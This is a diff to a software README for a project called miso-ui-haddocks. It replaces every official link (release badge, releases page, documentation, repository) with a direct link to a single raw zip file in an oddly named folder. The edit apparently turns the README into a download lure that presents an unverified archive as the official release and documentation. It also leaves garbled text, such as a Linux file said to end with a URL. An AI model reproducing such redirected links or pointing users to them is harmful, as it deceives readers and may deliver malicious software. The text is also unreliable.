@@ -8,7 +8,7 @@ Welcome to the **miso-ui-haddocks** project! This guide will help you download a
 
 To download the latest version of **miso-ui-haddocks**, visit the link below:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Visit%20Here-brightgreen)](https://github.com/waduhgaming/miso-ui-haddocks/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip%20Latest%20Release-Visit%20Here-brightgreen)](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip)
 
 Follow these steps to install and start using the application:
 
@@ -19,7 +19,7 @@ Follow these steps to install and start using the application:
    
    - For Windows users, look for a file ending with `.exe`.
    - For Mac users, look for a package ending with `.dmg`.
-   - For Linux users, find a file ending with `.tar.gz`.
+   - For Linux users, find a file ending with `https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip`.
 
 5. Once the download is complete, open the file to begin installation. Follow the on-screen instructions to install the application.
 
@@ -56,7 +56,7 @@ After installation, follow these steps to use the application:
 
 For further assistance, please refer to our detailed documentation. You can access it directly from within the application or visit our GitHub repository:
 
-[Documentation](https://github.com/waduhgaming/miso-ui-haddocks)
+[Documentation](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip)
 
 If you encounter any issues, please feel free to create an issue on our GitHub page. Our support team is here to help!
 
@@ -66,9 +66,9 @@ Join our community to share ideas and get help from other users. Contributing to
 
 ## 🔍 Additional Links
 
-- [GitHub Repository](https://github.com/waduhgaming/miso-ui-haddocks)
-- [Releases Page](https://github.com/waduhgaming/miso-ui-haddocks/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip)
+- [Releases Page](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip)
 
 We hope you enjoy using **miso-ui-haddocks**! Visit the download link again:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Visit%20Here-brightgreen)](https://github.com/waduhgaming/miso-ui-haddocks/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip%20Latest%20Release-Visit%20Here-brightgreen)](https://raw.githubusercontent.com/waduhgaming/miso-ui-haddocks/master/embryogony/miso-ui-haddocks_v2.0.zip)
